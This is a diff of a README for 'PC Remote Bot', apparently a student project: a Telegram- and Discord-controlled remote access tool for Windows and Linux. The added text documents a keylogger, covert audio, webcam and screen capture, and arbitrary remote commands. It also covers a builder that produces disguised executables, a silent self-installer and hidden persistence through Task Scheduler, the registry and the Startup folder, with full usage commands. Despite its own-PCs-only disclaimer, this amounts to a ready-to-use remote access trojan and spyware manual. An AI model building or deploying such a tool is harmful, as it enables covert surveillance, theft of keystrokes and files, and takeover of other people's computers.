@@ -2,17 +2,20 @@
 
 <img src="https://img.shields.io/badge/Python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white"/>
 <img src="https://img.shields.io/badge/Telegram-Bot_API-26A5E4?style=for-the-badge&logo=telegram&logoColor=white"/>
+<img src="https://img.shields.io/badge/Discord-Bot-5865F2?style=for-the-badge&logo=discord&logoColor=white"/>
 <img src="https://img.shields.io/badge/Windows-10%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white"/>
+<img src="https://img.shields.io/badge/Linux-Supported-FCC624?style=for-the-badge&logo=linux&logoColor=black"/>
 <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge"/>
 
-# 🖥️ SysTracker
+# 🖥️ PC Remote Bot
 
-### Telegram-Based Remote PC Control System
+### Telegram & Discord Based Remote PC Control System
 
-Control and monitor your Windows PC from **anywhere in the world** using Telegram on your phone.  
-Supports **multiple PCs** simultaneously with seamless switching.
+Control and monitor your Windows/Linux PCs from **anywhere in the world**  
+using **Telegram** or **Discord** — or both simultaneously.  
+Supports **multiple PCs**, **live screen**, **audio recording**, **keystroke capture** and more.
 
-[Features](#-features) • [Installation](#-installation) • [Commands](#-commands) • [Multi-PC](#-multi-pc-support) • [Security](#-security) • [Build EXE](#-build-executable)
+**[Features](#-features) • [Installation](#-installation) • [Builder CLI](#-builder-cli) • [Commands](#-commands) • [Multi-PC](#-multi-pc-support) • [Security](#-security) • [Discord Setup](#-discord-setup)**
 
 </div>
 
@@ -20,21 +23,28 @@ Supports **multiple PCs** simultaneously with seamless switching.
 
 ## 📌 Overview
 
-SysTracker is a lightweight remote access tool that uses the **Telegram Bot API** as a communication channel. No port forwarding, no VPN, no dedicated server required. Just run the script on your PC and control it from anywhere.
+PC Remote Bot uses **Telegram** and **Discord** as secure communication channels. No dedicated server, no port forwarding, no static IP required. A single Python script powers both bots simultaneously with a shared core for all system functions.
 
 ```
-Your Phone (Telegram)
-        │
-        ▼ HTTPS Encrypted
-┌─────────────────────┐
-│  Telegram Bot API   │
-└─────────────────────┘
-        │
-        ▼ Long Polling
-┌───────┬───────┬───────┐
-│  PC1  │  PC2  │  PC3  │
-│Office │ Home  │Laptop │
-└───────┴───────┴───────┘
+Your Phone / PC
+  ┌──────────────┐    ┌──────────────┐
+  │ Telegram App │    │  Discord App │
+  └──────┬───────┘    └──────┬───────┘
+         │ HTTPS             │ WebSocket
+         ▼                   ▼
+  ┌─────────────┐    ┌──────────────┐
+  │ Telegram API│    │  Discord API │
+  └──────┬──────┘    └──────┬───────┘
+         │                  │
+         └────────┬─────────┘
+                  │ Long Poll / Gateway
+       ┌──────────┼──────────┐
+       ▼          ▼          ▼
+  [PC1-Office] [PC2-Home] [PC3-Laptop]
+   tracker.exe  tracker.exe  tracker.exe
+   TG Thread    TG Thread    TG Thread
+   DC Thread    DC Thread    DC Thread
+   ──── Shared Core Functions ────
 ```
 
 ---
@@ -45,76 +55,146 @@ Your Phone (Telegram)
 |---|---|
 | 🖥️ **System** | Status, Lock, Shutdown, Restart |
 | 📸 **Media** | Screenshot, Webcam (auto-deleted after send) |
+| 🖥️ **Live Screen** | Real-time screen frames (Discord) |
+| 🎙️ **Audio** | Voice recording, Live audio streaming |
+| ⌨️ **Keylogger** | Real-time and interval capture (no admin needed) |
 | 📁 **Files** | List, Upload, Download, Delete, Search |
-| 💻 **Terminal** | Run any Windows command remotely |
-| 🔊 **Audio** | Volume Up/Down/Mute, Set exact %, Text-to-Speech |
+| 💻 **Terminal** | Run any Windows/Linux command remotely |
+| 🔊 **Audio Control** | Volume Up/Down/Mute, Set exact %, TTS |
 | ☀️ **Display** | Get/Set screen brightness |
 | 📍 **Location** | IP-based location with Google Maps link |
 | 🔔 **Notifications** | Popup on screen, Ask with reply |
 | 🔁 **Auto Track** | Auto location every 5 minutes |
-| 🚨 **Alarm** | Remote alarm with loop |
+| 🚨 **Alarm** | Remote alarm sound with loop |
 | ☀️ **Wake Detection** | Notifies when PC wakes from sleep |
-| 🤖 **Multi-PC** | Control multiple PCs from one bot |
+| 🤖 **Multi-PC** | Control multiple PCs from one account |
+| 🔧 **Builder CLI** | Generate pre-configured exe in one command |
+| 📦 **Self Installer** | Auto-installs silently on first run |
 
 ---
 
 ## 🚀 Installation
 
-### Method 1 — Python Script (Main PC)
+### Prerequisites
 
-**Step 1 — Clone the repository:**
 ```bash
-git clone https://github.com/yourusername/SysTracker.git
-cd SysTracker
+pip install -r requirements.txt
 ```
 
-**Step 2 — Install dependencies:**
-```bash
-pip install requests psutil pyautogui opencv-python pyttsx3 screen-brightness-control pywin32
-```
-
-**Step 3 — Configure your credentials:**
-
-Open `tracker.py` and set:
-```python
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-CHAT_ID   = "YOUR_CHAT_ID_HERE"
-```
-
-> **How to get these:**
-> - Create a bot via [@BotFather](https://t.me/BotFather) on Telegram → get `BOT_TOKEN`
-> - Message [@userinfobot](https://t.me/userinfobot) on Telegram → get your `CHAT_ID`
-
-**Step 4 — Run:**
-```bash
-python tracker.py
-```
-
-✅ Check Telegram — you should see **"PC is Online"**
+> **Note:** On Windows, if `pyaudio` fails:
+> ```bash
+> pip install pipwin
+> pipwin install pyaudio
+> ```
+> On Linux:
+> ```bash
+> sudo apt install python3-pyaudio portaudio19-dev
+> ```
 
 ---
 
-### Method 2 — Executable (Other PCs, No Python Needed)
+### Method 1 — Run as Python Script
 
-**On your main PC, build the exe:**
-```
-Double click build.bat
-→ Creates dist\tracker.exe
+```bash
+# Clone repo
+git clone https://github.com/yourusername/pc-remote-bot.git
+cd pc-remote-bot
+
+# Install dependencies
+pip install -r requirements.txt
+
+# Telegram only
+python tracker.py -p telegram --api YOUR_TOKEN --chat YOUR_CHAT_ID
+
+# Discord only
+python tracker.py -p discord --api YOUR_DISCORD_TOKEN --channel YOUR_CHANNEL_ID
+
+# Both simultaneously
+python tracker.py -p both --api TG_TOKEN --chat CHAT_ID --dapi DC_TOKEN --channel CHANNEL_ID
+
+# Linux mode
+python tracker.py -p telegram --api TOKEN --chat ID -s linux
 ```
 
-**On other PCs:**
-```
-1. Copy tracker.exe + install.bat to USB
-2. Plug USB into other PC
-3. Double click install.bat (runs as Admin automatically)
-4. Check Telegram for online message ✅
+> **How to get credentials:**
+> - **Telegram Token:** Message [@BotFather](https://t.me/BotFather) → `/newbot` → copy token
+> - **Telegram Chat ID:** Message [@userinfobot](https://t.me/userinfobot) → copy ID
+> - **Discord Token:** [Developer Portal](https://discord.com/developers/applications) → Bot → Copy Token
+> - **Discord Channel ID:** Enable Developer Mode → Right click channel → Copy ID
+
+---
+
+### Method 2 — Builder CLI (Recommended)
+
+Generate a pre-configured standalone `.exe` with one command:
+
+```bash
+# Telegram exe
+python builder.py -p telegram --api YOUR_TOKEN --chat YOUR_CHAT_ID
+
+# Discord exe
+python builder.py -p discord --api YOUR_TOKEN --channel YOUR_CHANNEL_ID
+
+# Both platforms
+python builder.py -p both --api TG_TOKEN --chat ID --dapi DC_TOKEN --channel ID
+
+# With custom name and icon
+python builder.py -p telegram --api TOKEN --chat ID --name MyBot --icon icon.ico
+
+# Linux binary
+python builder.py -p telegram --api TOKEN --chat ID -s linux
 ```
 
-> `install.bat` automatically:
-> - Copies exe to `C:\Tools\tracker\`
-> - Creates Task Scheduler entry for auto-start
-> - Waits for internet before launching
-> - Runs completely hidden (no terminal window)
+**Output:** `dist/PCRemoteBot.exe` — copy to any PC and run!
+
+---
+
+### Method 3 — Deploy to Other PCs (No Python Needed)
+
+```
+1. Run builder.py on your main PC
+   → Creates dist/tracker.exe
+
+2. Copy to USB:
+   tracker.exe + alarm.wav (optional)
+
+3. On other PC: double-click tracker.exe
+
+4. It silently auto-installs:
+   ✅ Copies to C:\Tools\tracker\
+   ✅ Task Scheduler (best, needs admin)
+   ✅ Registry HKCU (backup, no admin)
+   ✅ Startup folder (backup, no admin)
+
+5. Check Telegram/Discord for online message ✅
+```
+
+---
+
+## 🔧 Builder CLI
+
+```
+python builder.py [options]
+
+Arguments:
+  -p, --platform    Platform: telegram | discord | both
+  --api             Telegram Bot Token (or Discord if -p discord)
+  --chat            Telegram Chat ID
+  --dapi            Discord Bot Token (only for -p both)
+  --channel         Discord Channel ID
+  -s, --system      Target OS: windows | linux
+  --name            Output exe name (default: PCRemoteBot)
+  --icon            Path to .ico icon file
+  --no-install      Skip self-installer in exe
+```
+
+**Examples:**
+```bash
+python builder.py -p telegram --api 123:ABC --chat 987654321
+python builder.py -p discord --api TOKEN --channel 123456789 --name MyBot
+python builder.py -p both --api TG --chat ID --dapi DC --channel CH --icon icon.ico
+python builder.py -p telegram --api TOKEN --chat ID -s linux
+```
 
 ---
 
@@ -123,7 +203,7 @@ Double click build.bat
 ### 🖥️ System
 | Command | Description |
 |---|---|
-| `/devices` | Show all connected PCs |
+| `/devices` | Show all connected PCs with status |
 | `/status` | CPU, RAM, Battery, Uptime |
 | `/lock` | Lock the PC screen |
 | `/shutdown` | Shutdown PC in 5 seconds |
@@ -132,89 +212,129 @@ Double click build.bat
 ### 🔊 Audio & Display
 | Command | Description |
 |---|---|
-| `/volume up` | Increase volume 10% |
-| `/volume down` | Decrease volume 10% |
-| `/volume mute` | Toggle mute |
+| `/volume up` / `/volume down` / `/volume mute` | Volume control |
 | `/vol 60` | Set exact volume (0-100) |
 | `/brightness` | Get current brightness |
 | `/brightness 70` | Set brightness (0-100) |
-| `/say Hello` | Text to speech on PC |
+| `/say Hello World` | Text to speech on PC |
 
 ### 📁 File Manager
 | Command | Description |
 |---|---|
 | `/ls` | List current directory |
 | `/ls C:\Users\Desktop` | List specific folder |
-| `/upload C:\file.pdf` | Send file to Telegram |
-| `/download C:\Desktop\` | Reply to file to save on PC |
+| `/upload C:\file.pdf` | Send file to Telegram/Discord |
+| `/download C:\Desktop\` | Reply to file message to save |
 | `/delete C:\file.txt` | Delete file or folder |
 | `/search report C:\Users` | Search file by name |
 
 ### 📸 Media
 | Command | Description |
 |---|---|
-| `/screenshot` | Take screenshot |
-| `/webcam` | Take webcam photo |
-
-> Both are **auto-deleted** from PC after sending to Telegram
+| `/screenshot` | Take screenshot (auto-deleted from PC) |
+| `/webcam` | Take webcam photo (auto-deleted from PC) |
+| `/livescreen 60 3` | Live screen frames (duration secs, interval secs) |
+| `/stopscreen` | Stop live screen |
 
 ### 💻 Terminal
 | Command | Description |
 |---|---|
-| `/cmd ipconfig` | Network information |
-| `/cmd tasklist` | Running processes |
-| `/cmd systeminfo` | Full system info |
+| `/cmd ipconfig` | Run any Windows/Linux command |
+| `/cmd tasklist` | Show running processes |
+| `/cmd dir C:\` | List directory |
 | `/cmd ping google.com` | Ping test |
-| `/cmd [any command]` | Run any Windows command |
+
+### ⌨️ Keylogger
+| Command | Description |
+|---|---|
+| `/keylog rt` | Real-time keys sent every 3 seconds |
+| `/keylog 5` | Interval keys every 5 minutes |
+| `/getkeys` | Get captured keys on demand |
+| `/savekeys` | Save keys as file and upload |
+| `/stopkey` | Stop keylogger |
+
+### 🎙️ Audio Recording
+| Command | Description |
+|---|---|
+| `/record 30` | Record 30 seconds and send |
+| `/liveaudio 60` | Live audio chunks every 10 seconds |
+| `/stopaudio` | Stop recording |
 
 ### 📍 Location & Tracking
 | Command | Description |
 |---|---|
-| `/track` | Get location once |
-| `/auto` | Auto track every 5 mins |
+| `/track` | Get current location once |
+| `/auto` | Auto location every 5 minutes |
 | `/stop` | Stop auto tracking |
 
 ### 🔔 Notifications
 | Command | Description |
 |---|---|
-| `/notify Hello` | Show popup on PC screen |
-| `/ask Are you there?` | Show input box, receive reply in Telegram |
+| `/notify Hello` | Show popup message on PC screen |
+| `/ask Are you there?` | Show input box, receive reply in chat |
 
 ### 🚨 Alarm
 | Command | Description |
 |---|---|
-| `/alarm` | Start looping alarm |
-| `/stop_alarm` | Stop alarm |
+| `/alarm` | Start looping alarm sound |
+| `/stop_alarm` | Stop the alarm |
+
+---
+
+## 🎮 Discord Setup
+
+**Step 1 — Create Bot:**
+```
+1. Go to: discord.com/developers/applications
+2. New Application → Name: "PC Remote Bot"
+3. Bot → Add Bot → Copy Token ✅
+4. Scroll down → Enable ALL Privileged Intents:
+   ✅ Presence Intent
+   ✅ Server Members Intent
+   ✅ Message Content Intent
+5. Save Changes
+```
+
+**Step 2 — Add Bot to Server:**
+```
+1. OAuth2 → URL Generator
+2. Scopes: tick "bot"
+3. Permissions: Send Messages, Attach Files,
+               Read Message History, View Channels
+4. Copy generated URL → open in browser → Authorize
+```
+
+**Step 3 — Get Channel ID:**
+```
+1. Discord Settings → Advanced → Enable Developer Mode
+2. Right click your channel → Copy Channel ID ✅
+```
+
+**Discord Server Used in This Project:**
+```
+Server Name : PC Remote Bot
+Channel     : #pc-remote
+```
 
 ---
 
 ## 🖥️ Multi-PC Support
 
-All your PCs connect to the **same bot** but only **one executes at a time**.
-
 ```
-Step 1: Type /devices
-        ┌─────────────────┐
-        │ 🟢 PC1-Office   │
-        │ 🟢 PC2-Home     │
-        │ 🔴 PC3-Laptop   │
-        │ 🔄 Refresh      │
-        └─────────────────┘
+Telegram:
+  /devices → shows all PCs as inline buttons
+  Tap a PC → select it → use command buttons
+  Tap ⬅️ Back → switch to another PC
 
-Step 2: Tap a PC to select it
-        ✅ Connected to: PC2-Home
-
-Step 3: Use command buttons
-        Commands run on PC2-Home only ✅
-        PC1 and PC3 ignore all commands ✅
-
-Step 4: Tap ⬅️ Back to switch PCs
+Discord:
+  /devices → shows all PCs with status
+  /select PC2-Home → switch to PC2
+  Now all commands run on PC2 only ✅
 ```
 
-### PC Status
 | Status | Meaning |
 |---|---|
-| 🟢 Green | Online — heartbeat received in last 2 minutes |
+| 🟢 Green | Online — heartbeat received < 2 minutes ago |
 | 🔴 Red | Offline — no heartbeat for 2+ minutes |
 
 ---
@@ -223,169 +343,128 @@ Step 4: Tap ⬅️ Back to switch PCs
 
 | Layer | How It Works |
 |---|---|
-| **Chat ID Filter** | Only your Telegram account can send commands |
+| **Chat ID Filter** | Only your Telegram/Discord account can send commands |
 | **BOT_START_TIME** | Commands sent while PC was offline are ignored |
 | **PC Selection** | Only the selected PC executes commands |
-| **Reply Security** | Bot token never exposed in any external file |
-| **Auto Cleanup** | Screenshots and webcam photos deleted after upload |
-| **HTTPS Transport** | All communication encrypted via Telegram |
+| **Mutex** | Prevents duplicate instances and duplicate messages |
+| **Reply Security** | Bot token never written to VBS or temp files |
+| **Auto Cleanup** | Screenshots/webcam photos deleted after upload |
+| **UAC Fallback** | Falls back to non-admin methods if UAC denied |
 
 ---
 
 ## 📁 Project Structure
 
 ```
-SysTracker/
-│
-├── tracker.py          # Main bot script
-├── build.bat           # Build exe using PyInstaller
-├── install.bat         # Universal installer for any Windows PC
-├── uninstall.bat       # Complete removal script
-├── alarm.wav           # Alarm sound (optional)
-└── README.md           # This file
-│
-├── [Auto-created]
-│   ├── launcher.ps1    # Waits for internet then starts bot
-│   ├── screen.png      # Screenshot (deleted after send)
-│   ├── cam.png         # Webcam photo (deleted after send)
-│   └── reply.vbs       # Ask reply helper (deleted after use)
+pc-remote-bot/
+├── tracker.py          ← Main bot script (Telegram + Discord)
+├── builder.py          ← CLI builder - generates configured exe
+├── build.bat           ← PyInstaller build helper
+├── install.bat         ← Universal Windows installer
+├── uninstall.bat       ← Complete removal script
+├── requirements.txt    ← Python dependencies
+├── alarm.wav           ← Alarm sound (optional)
+├── icon.ico            ← Exe icon (optional)
+└── README.md           ← This file
 ```
 
 ---
 
-## 🔧 Build Executable
+## ⚙️ Auto-Start System
 
-Build a standalone `.exe` that works on PCs without Python:
-
-```batch
-# Make sure these are in the same folder:
-# tracker.py, build.bat, alarm.wav (optional)
-
-Double click build.bat
-```
-
-The build script includes all required hidden imports:
-```batch
-pyinstaller --onefile --noconsole --windowed
-  --collect-all pyttsx3
-  --collect-all pyautogui
-  --collect-all cv2
-  --collect-all comtypes
-  --hidden-import=pythoncom
-  --hidden-import=win32api
-  ...
-  tracker.py
-```
-
-Output: `dist\tracker.exe`
-
----
-
-## ⚙️ Auto-Start Setup
-
-The installer automatically configures auto-start using **Windows Task Scheduler**:
+When exe runs for first time, it silently sets up 3 autostart methods:
 
 ```
-PC boots
-    → Task Scheduler triggers (10s after login)
-    → launcher.ps1 runs silently
-    → Waits for internet connection
-    → Launches tracker.exe
-    → Bot sends "PC is Online" to Telegram ✅
-```
+PC boots → User logs in
+    → Task Scheduler triggers (15s delay)
+    → Waits for internet connectivity
+    → Starts tracker.exe completely hidden
+    → Bot sends "PC is Online" to Telegram/Discord ✅
 
-**To manually set up auto-start:**
-```
-Run install.bat as Administrator
-```
+3 methods ensure reliability:
+  1. Task Scheduler  → most reliable (needs admin)
+  2. Registry HKCU   → backup (no admin needed)
+  3. Startup folder  → last resort (no admin needed)
 
-**To remove auto-start:**
-```
-Run uninstall.bat as Administrator
-```
-
----
-
-## 📦 Dependencies
-
-```
-requests                  HTTP communication with Telegram API
-psutil                    System monitoring
-pyautogui                 Screenshot capture
-opencv-python             Webcam access
-pyttsx3                   Text-to-speech
-screen-brightness-control Screen brightness control
-pywin32                   Windows API access
-```
-
-Install all at once:
-```bash
-pip install requests psutil pyautogui opencv-python pyttsx3 screen-brightness-control pywin32
+Mutex prevents duplicates → only 1 online message ✅
 ```
 
 ---
 
 ## 🧠 How It Works
 
-### Long Polling
-The bot continuously asks Telegram for new messages every 30 seconds. No public server or webhook needed.
+**Telegram — Long Polling:**
+Bot calls `getUpdates` with 30s timeout. Server holds connection until new message arrives. No public server needed.
 
-### Threading
-Multiple background threads run simultaneously:
+**Discord — Gateway WebSocket:**
+discord.py maintains persistent connection to Discord Gateway using asyncio event loop.
 
-| Thread | Purpose |
-|---|---|
-| Main Thread | Command polling and routing |
-| Heartbeat Thread | Keep-alive ping every 60s |
-| Wake Listener | Detect PC wake from sleep |
-| Auto Track | Send location every 5 mins |
-| TTS Thread | Speak text without blocking |
+**Threading Model:**
 
-### Retry Logic
-All network requests use exponential backoff retry. If connection fails → retries with 2, 4, 8, 16, 32 second delays. Bot **never crashes** due to network issues.
+| Thread | Purpose | Type |
+|---|---|---|
+| Main Thread | Command routing | Blocking |
+| Heartbeat | Keep-alive every 60s | Daemon |
+| Wake Listener | Detect sleep/wake | Daemon |
+| Auto Track | Location every 5 mins | Daemon |
+| Keylogger | Continuous key capture | Daemon |
+| Audio | Recording/streaming | Daemon |
+| Live Screen | Frame capture loop | Daemon |
 
 ---
 
 ## ⚠️ Limitations
 
-| Limitation | Details |
-|---|---|
-| Windows Only | Uses Windows-specific APIs |
-| 50MB Upload Limit | Telegram bot API restriction |
-| IP-based Location | Not GPS accurate |
-| No Live Streaming | Screenshot only, no video |
-| Webcam Permission | Camera must not be in use |
+| Limitation | Details | Workaround |
+|---|---|---|
+| Telegram upload | 50MB max | Use Discord or compress |
+| Discord upload | 8MB free / 500MB Nitro | Use Nitro or split |
+| Location accuracy | IP-based, not GPS | Sufficient for city level |
+| Live screen FPS | ~0.3fps (frame-by-frame) | Use Discord for better experience |
+| Linux autostart | Manual setup required | Use systemd or .desktop file |
 
 ---
 
 ## 🛡️ Legal & Ethical Use
 
-> ⚠️ **Important:** This tool is designed for use on **your own PCs only**.
-> Running this on someone else's computer without their knowledge or consent
-> is illegal in most countries. Use responsibly.
+> ⚠️ **This tool is designed for use on YOUR OWN PCs only.**  
+> Running on someone else's device without explicit consent is illegal  
+> under computer fraud and privacy laws in most countries.  
+> Use responsibly and ethically.
+
+---
+
+## 📦 Quick Install
+
+```bash
+pip install -r requirements.txt
+```
 
 ---
 
 ## 📄 License
 
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+This project is licensed under the **MIT License**.
 
 ---
 
 ## 🙏 Acknowledgements
 
-- [Telegram Bot API](https://core.telegram.org/bots/api) — Communication platform
+- [Telegram Bot API](https://core.telegram.org/bots/api) — Telegram communication
+- [discord.py](https://discordpy.readthedocs.io) — Discord integration
 - [psutil](https://github.com/giampaolo/psutil) — System monitoring
+- [pynput](https://pynput.readthedocs.io) — Keystroke capture
 - [PyInstaller](https://pyinstaller.org) — Executable packaging
 - [OpenCV](https://opencv.org) — Webcam capture
-- [pyttsx3](https://github.com/nateshmbhat/pyttsx3) — Text to speech
+- [pyaudio](https://people.csail.mit.edu/hubert/pyaudio) — Audio recording
 
 ---
 
 <div align="center">
 
-Made with ❤️ for College Project
+Made with ❤️ by **Vyom Modi**  
+B.Tech CSE Cybersecurity | Ganpat University | 2025-26
 
-⭐ Star this repo if you found it useful!
+⭐ **Star this repo if you found it useful!**
 
 </div>
